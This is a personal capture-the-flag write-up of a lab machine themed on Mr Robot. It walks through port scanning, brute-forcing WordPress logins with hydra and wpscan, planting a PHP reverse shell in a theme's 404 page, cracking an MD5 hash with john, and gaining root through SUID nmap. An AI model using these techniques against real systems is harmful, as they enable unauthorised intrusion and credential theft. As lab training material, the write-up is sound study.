# Step 1: Enumeration
## Scan
```
nmap -sS -A -T4 -e tun0 -oN nmap.log -vv 10.10.124.89
```
```
masscan -e tun0 --rate 1000 -p0-65535 -oL masscan.log 10.10.124.89
```
### Results
#### Nmap
```
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```
#### Masscan
```
open tcp 443 10.10.124.89 1601501516
open tcp 80 10.10.124.89 1601501525
```

So we know there's a webserver, doesn't appear to be anything else.
Time to spider the webpage and use gobuster to find any hidden directories.

## Finding directories

Note: We should use gobuster on both ports (443, 80)

### ZAP
First things first, I will use OWASP Zap to spider the website on port 80.
After spidering the site, I checked to see if there was anything interesting.
There were no suspicious paths, so I checked the contents of the responses for
the paths.

In robots.txt I found
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`key-1-of-3.txt` seemed awfully suspicious, so I navigated to `/key-1-of-3.txt` in my
browser and found the first key.

Navigating to the other path, `fsociety.dic`, brings you to a blog. I started the spider
again on this newfound resource.

Checking the site alerts, I gain some useful info: 
- X-Powered-By: PHP/5.5.29
- Set-Cookie: wordpress_test_cookie

Checking for hidden fields on the login page, I found:
```
<input type="" name="redirect_to" value="https://10.10.124.89/wp-admin/">
<input type="" name="testcookie" value="1">
```

### GoBuster
#### Interesting directories
```
/admin
/phpmyadmin
/rdf
/readme
/robots
/rss2
/wp-admin
/wp-config
/wp-cron
/wp-links-opml
/wp-load
/wp-login
```

- /admin has some weird behaviour
- /phpmyadmin looks like it can be exploited by spoofing hostname
- /readme returns a message about liking where your head is at
- /wp-config

Also found the wordpress version http://wordpress.org/?v=4.3.1

# Had to reference video

I got stuck, already went through all the indexed pages, tried brute forcing,
didn't know what to do. Turns out I was being silly and didn't notice that
fsocity.dic was NOT fsociety.dic, had I noticed that or simply copied the value
instead of typing it by hand I may have been able to get by without referencing
the video.

Anyways, so after getting my hands on fsocity.dic, I used hydra to find the USR
and PWD pair.

# Step 2: Exploitation

### Hydra
```
hydra -L fsocity.dic -p test 10.10.167.13 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```
```
hydra -L Elliot -p fsocity.dic 10.10.167.13 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid password" -t 30
```

### Wpscan
```
wpscan --url 10.10.167.13 -P fsocity.dic -U elliot
```
This ran a lot faster than hydra, like 10,000 times as fast

#### Result
```
[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
```

## Getting a shell
Now that we have access to file management systems, we can upload a
reverse shell to the server. I will be using the reverse shell from a
previous room, Vulnuversity.

After replacing the contents of the theme's 404 page with php-reverse-shell.php,
I started ncat and then navigated to a 404 page in the browser. Once I had shell
access, I navigated to /home/robot and tried to open the flag file, but permission
was denied. I opened the other file which contained a username and md5 hashed password:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Using john-the-ripper on the hash with fsocity.dic as the wordlist failed, but using
rockyou.txt found the password:
```
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/passwords/rockyou.txt --fork=2 hash.txt
```
#### Result
```
abcdefghijklmnopqrstuvwxyz (?)
```

# Step 3: Escalation
## Upgrading shell

I needed to reference the video again as I wasn't sure how to get a tty shell, turns
out I've already done it before but forgot:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then I logged in as robot and cat'd out the second flag.

## Escalation

So I kind of knew what to do here, I needed to look for binaries with root permissions:
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

I saw nmap in the list of binaries and thought it was peculiar, but had no clue how to
exploit it. After wracking my head I referenced the video again, and I was happy
to find I was on the right course. I was introduced to a website called https://gtfobins.github.io
of which had an entry on nmap.

```
nmap --interactive
nmap> !sh
```

Suprisingly, nmap could be used to execute shell commands as root. I used this to peek into the
/root folder and found the third key.
